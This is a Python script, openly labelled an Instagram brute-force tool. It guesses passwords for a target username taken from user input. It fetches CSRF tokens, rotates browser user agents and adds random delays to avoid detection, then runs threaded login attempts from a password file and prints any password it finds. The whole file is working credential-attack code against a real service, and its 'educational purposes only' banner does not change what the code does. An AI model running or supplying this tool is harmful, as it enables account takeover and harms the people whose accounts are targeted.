# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Instagram Brute Force Script
A script for brute force attacks on Instagram accounts.
"""

import os
import sys
import time
import random
import requests
import json
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor


class InstagramBruteForcer:
    """Instagram Brute Force Attack Class"""

    def __init__(self, target_username, password_list, proxy_list=None):
        self.target_username = target_username
        self.password_list = password_list
        self.proxy_list = proxy_list or []
        self.found_password = None
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]

    def get_random_headers(self):
        """Generate random headers for requests"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }

    def get_csrf_token(self):
        """Get CSRF token from Instagram login page"""
        try:
            response = self.session.get('https://www.instagram.com/accounts/login/',
                                        headers=self.get_random_headers(), timeout=10)
            if 'csrf' in response.text:
                csrf_token = response.text.split('"csrf_token":"')[
                    1].split('"')[0]
                return csrf_token
        except Exception as e:
            print(f"❌ Error getting CSRF token: {e}")
        return None

    def attempt_login(self, password):
        """Attempt to login with given password"""
        try:
            csrf_token = self.get_csrf_token()
            if not csrf_token:
                return False

            login_data = {
                'username': self.target_username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }

            headers = self.get_random_headers()
            headers.update({
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Content-Type': 'application/x-www-form-urlencoded'
            })

            # Random delay between attempts
            time.sleep(random.uniform(2, 5))

            response = self.session.post('https://www.instagram.com/accounts/login/ajax/',
                                         data=login_data, headers=headers, timeout=10)

            if response.status_code == 200:
                result = response.json()
                if result.get('authenticated'):
                    print(f"✅ SUCCESS! Password found: {password}")
                    self.found_password = password
                    return True
                elif 'checkpoint_required' in response.text:
                    print(f"⚠️  Checkpoint required for password: {password}")
                    return False
                else:
                    print(f"❌ Failed login attempt with password: {password}")
                    return False
            else:
                print(
                    f"❌ HTTP Error {response.status_code} for password: {password}")
                return False

        except Exception as e:
            print(f"❌ Error attempting login with {password}: {e}")
            return False

    def brute_force_attack(self, max_threads=3):
        """Execute brute force attack with threading"""
        print(f"🎯 Starting brute force attack on: {self.target_username}")
        print(f"🔢 Total passwords to try: {len(self.password_list)}")
        print(f"🧵 Using {max_threads} threads")
        print("=" * 50)

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for password in self.password_list:
                if self.found_password:
                    break
                future = executor.submit(self.attempt_login, password)
                futures.append(future)

            for future in futures:
                if self.found_password:
                    break
                future.result()

        if self.found_password:
            print(f"\n🎉 ATTACK SUCCESSFUL!")
            print(f"👤 Username: {self.target_username}")
            print(f"🔑 Password: {self.found_password}")
            return True
        else:
            print(f"\n💔 Attack failed. No valid password found.")
            return False


def load_password_list(file_path):
    """Load password list from file"""
    passwords = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                password = line.strip()
                if password:
                    passwords.append(password)
        print(f"📋 Loaded {len(passwords)} passwords from {file_path}")
        return passwords
    except Exception as e:
        print(f"❌ Error loading password list: {e}")
        return []


def main():
    """Main function"""
    print("🔴 Instagram Brute Force Tool")
    print("⚠️  WARNING: This tool is for educational purposes only!")
    print("=" * 50)

    # Configuration
    target_username = input("👤 Enter target username: ").strip()
    if not target_username:
        print("❌ Username is required!")
        return

    password_file = input(
        "📋 Enter password list file path (default: ../passwords.txt): ").strip()
    if not password_file:
        password_file = "../passwords.txt"

    # Load passwords
    passwords = load_password_list(password_file)
    if not passwords:
        print("❌ No passwords loaded. Exiting.")
        return

    # Create brute forcer instance
    brute_forcer = InstagramBruteForcer(target_username, passwords)

    # Start attack
    try:
        brute_forcer.brute_force_attack(max_threads=2)
    except KeyboardInterrupt:
        print("\n⚠️  Attack interrupted by user.")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")


if __name__ == "__main__":
    main()
